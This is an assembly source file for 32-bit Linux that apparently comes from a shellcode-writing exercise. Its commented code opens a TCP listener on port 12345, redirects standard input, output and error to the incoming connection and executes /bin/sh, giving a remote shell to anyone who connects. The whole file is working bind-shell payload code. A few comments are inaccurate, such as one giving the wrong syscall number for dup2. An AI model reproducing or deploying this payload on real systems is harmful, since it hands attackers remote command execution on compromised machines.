; creating /bin/sh
; IA32 assembly

global _start

section .text
_start:

; First we need to create socket. When we look at System Call numbers from linux header, number  102 is number for socketcall.
;socketcall handles socket, bind, listen, accept
;root@kali:~# cat /usr/include/linux/net.h tells


;SYS_SOCKET 1
;SYS_BIND 2
;SYS_CONNECT 3
;SYS_LISTEN 4
;SYS_ACCEPT 5
;socketcall takes 2 arguments

xor eax, eax ; Generate Zeros. Clean System Call register
xor ebx, ebx ;
cdq ;cleans edx, one byte smaller comparing to  xor edx, edx

;According to our C-code, we need only three ingeter parameters.
;s = socket(2,1,0) We need to push them in reverse order
push eax ;Zero
push 0x01 ; One
push 0x02 ; Two
mov ecx, esp ; Stackpointer to ecx, as second argument
mov bl, 0x1 ; first argument (Number for Socket)
mov al, 102 ; socketcall to AL
int 0x80 ; CREATE SOCKET

mov esi,eax ;return value to esi register

;Next we should bind
;bind(s, (struct sockaddr*)&serv_addr, 0x10);
;struct sockaddr_in {
;     sa_family_t    sin_family; /* address family: AF_INET */
;    in_port_t      sin_port;   /* port in network byte order */
;    struct in_addr sin_addr;   /* internet address */
; };

push edx ; sin_addr
push WORD 0x3930 ; sin_port
push WORD 0x2 ; sin_family

mov ecx, esp ; ecx containst struct
push 0x10 ; length
push ecx ;contains &serv_addr
push esi ; file descriptor of socket
mov ecx, esp ;stack to second argument
mov bl, 0x2 ; first argument (Number for bind)
mov al, 102 ; socketcall handles socket, bind, listen, accept
int 0x80 ;BIND

push edx; Zero means, only one connection accepted, no queue
push esi
mov ecx, esp
mov bl, 0x4
mov al, 102 ; socketcall handles socket, bind, listen, accept
int 0x80 ;LISTEN

push edx
push edx
push esi
mov ecx, esp
mov bl, 0x5
mov al, 102 ; socketcall handles socket, bind, listen, accept
int 0x80; ACCEPT
mov ebx, eax ;Accepted connection file descriptor stored to first argument

xor ecx, ecx; clean register
mov cl, 3
loop: ;dup2 loop
dec cl ; decrease second parameter, READ=0, WRITE=1, ERR=2
mov al, 63; according to linux32 header, systemcall number for dup2 is 83
int 0x80 ; PIPE
jnz loop

xor eax, eax
push eax
push 0x68732f6e ;
push 0x69622f2f ; //bin/sh to stack


mov ebx, esp ; Make EBX point to //bin/sh on the Stack using ESP

; PUSH 0x00000000 using EAX and point EDX to it using ESP

push eax
mov edx, esp

; PUSH Address of //bin/sh on the Stack and make ECX point to it using ESP

push ebx
mov ecx, esp

; EAX = 0, Let's move 11 into AL to avoid nulls in the Shellcode

mov al, 0xB
int 0x80